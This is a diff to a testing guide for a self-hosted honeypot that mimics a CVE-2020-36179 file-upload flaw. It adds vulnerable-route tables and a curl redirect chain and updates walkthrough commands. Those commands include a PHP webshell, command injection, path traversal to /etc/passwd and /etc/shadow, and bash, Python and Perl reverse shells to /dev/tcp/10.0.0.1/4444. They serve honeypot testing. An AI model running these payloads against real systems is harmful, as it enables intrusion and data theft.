@@ -5,7 +5,34 @@
 
 ---
 
-## Target Endpoints
+## 🔥 Real-App Vulnerability Layer (Start Here)
+
+Before reaching the honeypot's CVE-2020-36179 trap, your IP must first accumulate **100 risk points** so the proxy redirects you. The `real-app` service exposes 6 deliberately vulnerable routes — these are the recommended starting points for any red-team exercise.
+
+| Route | Vulnerability | Points |
+|-------|--------------|--------|
+| `GET /api/search?q=<payload>` | SQL Injection | **+20** |
+| `GET /api/files?path=<payload>` | Path Traversal | **+25** |
+| `GET /api/admin/users` | Admin Enumeration | **+20** |
+| `POST /api/execute` body `{"cmd":"..."}` | Command Injection | **+40** |
+| `POST /api/upload` (webshell `.php`) | Webshell Upload | **+40** |
+| `GET /api/account?id=<id>` | IDOR | **+10** |
+
+Every hit logs a `[VULN:TAG]` line to `real_app.log`. Monitor your progress live in the **REAL-APP ATTACKS** tab at `http://localhost:8002` — it shows your IP's risk score bar, attack event feed, and a `🔴 REDIRECT TRIGGERED` marker when you cross 100 points.
+
+**Quick redirect chain (3 requests, ≥ 105 pts):**
+```bash
+curl -X POST -F "file=@shell.php" http://localhost/api/upload             # +40
+curl -X POST -d '{"cmd":"whoami;id"}' http://localhost/api/execute         # +40
+curl "http://localhost/api/files?path=../../../../etc/passwd"               # +25 → 105 ✅
+```
+
+> See [`EXPLOITATION_GUIDE.md`](../EXPLOITATION_GUIDE.md) and [`docs/ATTACK_REAL_SYSTEM.md`](ATTACK_REAL_SYSTEM.md) for full walkthroughs.
+
+---
+
+## Target Endpoints (CVE-2020-36179 Honeypot Traps)
+
 
 | Endpoint                                         | Type          | Looks like                  |
 | ------------------------------------------------ | ------------- | --------------------------- |
@@ -17,14 +44,19 @@
 
 ## Step 1 — Reconnaissance
 
+> When using `docker compose -f docker-compose.yaml up -d`, target the attacker-facing proxy on port `80`:
+> `http://<honeypot-ip>`
+>
+> If you run the honeypot manually with `python honeypot.py`, use `http://<honeypot-ip>:8001` instead.
+
 Open a browser or use `curl` to discover the upload forms:
 
 ```bash
 # Discover Spring endpoint
-curl -v http://<honeypot-ip>:8001/api/v2/documents/compliance-upload
+curl -v http://<honeypot-ip>/api/v2/documents/compliance-upload
 
 # Discover PHP endpoint
-curl -v http://<honeypot-ip>:8001/clientportal/support/attachments.php
+curl -v http://<honeypot-ip>/clientportal/support/attachments.php
 ```
 
 Both return realistic HTML upload forms.  
@@ -39,7 +71,7 @@ Both return realistic HTML upload forms.
 curl -X POST \
   -F "file=@report.pdf;filename=report.pdf" \
   -F "ticket_id=TKT-0001" \
-  http://<honeypot-ip>:8001/clientportal/support/attachments.php
+  http://<honeypot-ip>/clientportal/support/attachments.php
 ```
 
 Expected response: `{"status": "uploaded", "filename": "report.pdf", ...}`
@@ -61,15 +93,15 @@ A plain `.php` file with no payload is ignored.
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 # Upload via PHP endpoint
-curl -X POST \
+curl -v -X POST \
   -F "file=@shell.php;filename=shell.php" \
   -F "ticket_id=TKT-9999" \
-  http://<honeypot-ip>:8001/clientportal/support/attachments.php
+  http://<honeypot-ip>/clientportal/support/attachments.php
 
 # Upload via Spring endpoint
 curl -X POST \
   -F "file=@shell.php;filename=shell.php" \
-  http://<honeypot-ip>:8001/api/v2/documents/compliance-upload
+  http://<honeypot-ip>/api/v2/documents/compliance-upload
 ```
 
 Other payload patterns the honeypot detects:
@@ -91,28 +123,28 @@ Guessing random filenames returns `403 Forbidden`.
 
 ```bash
 # Basic identity commands
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=whoami"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=id"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=uname+-a"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=hostname"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=whoami"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=id"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=uname+-a"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=hostname"
 
 # Recon commands
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=ls+-la"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=cat+/etc/passwd"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=cat+/etc/hosts"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=ifconfig"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=ps+aux"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=env"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=ls+-la"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=cat+/etc/passwd"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=cat+/etc/hosts"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=ifconfig"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=ps+aux"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=env"
 
 # Network info
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=netstat+-tulpn"
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=ss+-tulpn"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=netstat+-tulpn"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=ss+-tulpn"
 
 # /etc/shadow (returns Permission denied — www-data)
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=cat+/etc/shadow"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=cat+/etc/shadow"
 
 # Privilege check
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=sudo+-l"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=sudo+-l"
 ```
 
 Expected output: realistic Linux shell responses from `www-data` on `bankcorpweb-02.internal`.
@@ -125,13 +157,13 @@ Expected output: realistic Linux shell responses from `www-data` on `bankcorpweb
 
 ```bash
 # Netcat reverse shell
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261"
 
 # Python reverse shell
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=python3+-c+'import+socket,os,pty;...'"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=python3+-c+'import+socket,os,pty;...'"
 
 # Perl reverse shell
-curl "http://<honeypot-ip>:8001/uploads/shell.php?cmd=perl+-e+'use+Socket;...'"
+curl "http://<honeypot-ip>/uploads/shell.php?cmd=perl+-e+'use+Socket;...'"
 ```
 
 The honeypot simulates a connection timeout (1.5 s delay, empty response).  
@@ -143,7 +175,7 @@ The honeypot simulates a connection timeout (1.5 s delay, empty response).
 
 ```bash
 # Random filename — should return 403
-curl -v "http://<honeypot-ip>:8001/uploads/notmyshell.php?cmd=id"
+curl -v "http://<honeypot-ip>/uploads/notmyshell.php?cmd=id"
 ```
 
 Expected: `HTTP 403 Forbidden` (Apache-style error page, no shell output).
@@ -154,7 +186,7 @@ Expected: `HTTP 403 Forbidden` (Apache-style error page, no shell output).
 
 ```bash
 #!/bin/bash
-HOST="http://localhost:8001"
+HOST="http://localhost"
 SHELL_FILE="shell.php"
 
 echo "[1] Checking upload forms..."
@@ -188,7 +220,7 @@ echo "Done. Check honeypot logs for all captured events."
 ## Dashboard — View Captured Events
 
 ```bash
-curl http://<honeypot-ip>:8001/api/dashboard/cve/file-upload | python3 -m json.tool
+curl http://<honeypot-ip>/api/dashboard/cve/file-upload | python3 -m json.tool
 ```
 
 Fields returned:
